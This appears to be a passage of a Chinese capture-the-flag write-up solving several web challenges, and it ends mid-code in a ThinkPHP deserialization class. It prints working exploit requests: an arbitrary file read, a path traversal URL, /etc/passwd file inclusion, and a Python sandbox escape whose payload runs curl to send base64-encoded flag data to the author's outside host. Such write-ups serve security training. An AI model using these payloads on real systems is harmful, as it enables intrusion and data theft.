<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /uploadfile HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:3333</span><br><span class="line">Content-Length: 77</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://127.0.0.1:3333</span><br><span class="line">Referer: http://127.0.0.1:3333/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;files&quot;:&#123;&quot;file&quot;:&#123;&quot;path&quot;:&quot;flag&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>来进行任意文件读取</p>
<p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p>
<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>,<span class="string">&quot;IndexController@init&quot;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/rm&#x27;</span>,<span class="string">&quot;IndexController@rm&quot;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/tmp/&#123;filename&#125;&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    readfile(<span class="string">&quot;./var/tmp/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br><span class="line">Route::post(<span class="string">&#x27;/upload&#x27;</span>,<span class="string">&quot;IndexController@upload&quot;</span>);</span><br><span class="line">Route::get(<span class="string">&#x27;/move/log/&#123;filename&#125;&#x27;</span>, <span class="string">&#x27;IndexController@moveLog&#x27;</span>)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] !== <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; strpos(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],<span class="string">&quot;192.168.&quot;</span>) !== <span class="number">0</span> &amp;&amp; strpos(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],<span class="string">&quot;10.&quot;</span>) !== <span class="number">0</span> )  &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;admin only&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])))&#123;</span><br><span class="line">            mkdir(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>], <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">                rmdir(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;rmdir&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                unlink(<span class="string">&quot;/var/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;unlink&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>], <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) <span class="keyword">die</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>],base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>]));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;/var/tmp/&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveLog</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> =date(<span class="string">&quot;Y-m-d&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>))&#123;</span><br><span class="line">            mkdir(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$opts</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;method&#x27;</span>=&gt;<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span>=&gt;<span class="number">1</span>,<span class="comment">//单位秒</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="string">&quot;http://127.0.0.1/tmp/&quot;</span>.md5(<span class="string">&#x27;127.0.0.1&#x27;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>,<span class="literal">false</span>,stream_context_create(<span class="variable">$opts</span>));</span><br><span class="line">        file_put_contents(storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> storage_path(<span class="string">&quot;logs&quot;</span>).<span class="string">&quot;/&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>storage_path(“logs”):/var/www/html/storage/logs</p>
<p>upload dir : /var/tmp/md5(IP)/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/tmp/&#123;filename&#125;&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    readfile(<span class="string">&quot;./var/tmp/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">&#125;)-&gt;where(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;(.*)&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>直接任意文件读取，但是因为两个../服务器不会解析直接报错的原因无法穿到根目录，后来想到在弄个index.php就好了<br>最后的payload:<a target="_blank" rel="noopener" href="http://39.104.93.188/flag">http://39.104.93.188/index.php/tmp/../../flag</a></p>
<p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span>():</span></span><br><span class="line">    secret = request.form[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exec</span>(secret)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xXXxXXx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试环境：<a target="_blank" rel="noopener" href="http://ccreater.top:60011/">http://ccreater.top:60011/</a><br>禁用字符：</p>
<p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p>
<p>利用魔术方法? : <code>__getitem__,__getattr__</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=__import__(&#x27;os&#x27;).system(&#x27;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#x27;) HTTP/1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://39.104.90.30:10006/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br></pre></td></tr></table></figure>

<h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=__import__(&#x27;os&#x27;).system(&#x27;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#x27;) HTTP/1.1</span><br><span class="line">Host: 39.104.90.30:10006</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: image/webp,image/apng,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://39.104.90.30:10006/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx3B8HB5b</span><br><span class="line">Content-Disposition: form-data; name=&quot;cmd&quot;</span><br><span class="line"></span><br><span class="line">request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;</span><br><span class="line">------WebKitFormBoundaryx3B8HB5b--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="为何payload能运行"><a href="#为何payload能运行" class="headerlink" title="为何payload能运行"></a>为何payload能运行</h3><p>我们都知道python 调用类方法的时候会传入<code>self</code>参数，而我们调用<code>app.config==request.args.a</code>应该也会传入self参数，那么为什么这个payload可以成功</p>
<p>测试代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>():</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line">a = A()</span><br><span class="line">a.__class__.__eq__=<span class="built_in">eval</span></span><br><span class="line">a==<span class="string">&quot;print(123)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>我们跟进python底层看看</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p>
<p>这里显示nargs显示只有1个参数，参看堆栈，跟踪到最开始的地方</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p>
<p>这里我们确实传入了self,其中v是<code>self</code>,w是<code>print(123)</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p>
<p>在<code>call_unbound</code>处我们发现了原因，是因为ubound==0</p>
<p>在<code>lookup_maybe_method</code>中设置了ubound的值</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p>
<p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p>
<blockquote>
<p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p>
</blockquote>
<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.41.124/public/log.txt</span><br><span class="line">http://39.99.41.124/public/test/</span><br><span class="line">http://39.99.41.124/public/nationalsb/login.php</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在<a target="_blank" rel="noopener" href="http://39.99.41.124/public/nationalsb/js/script.js%E4%B8%AD%E5%8F%91%E7%8E%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9A">http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//username:Admin1964752</span><br><span class="line">//password:DsaPPPP!@#amspe1221</span><br><span class="line">//Secret **** is your birthday</span><br></pre></td></tr></table></figure>

<p>文件包含:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 39.99.41.124</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">file=/etc/passwd</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Warning&lt;/b&gt;:  include(): Failed opening &#x27;php://filter/read=convert.base64-encode/resource=index.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Host: 39.99.41.124</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> \<span class="title">think</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  	<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Warning&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#x27;</span>;  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  	unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;s3cr3tk3y&#x27;</span>]));</span><br><span class="line">    <span class="keyword">echo</span>(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;s3cr3tk3y&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>/var/www/html/protect.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;cjbtest&#x27;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">	    <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span 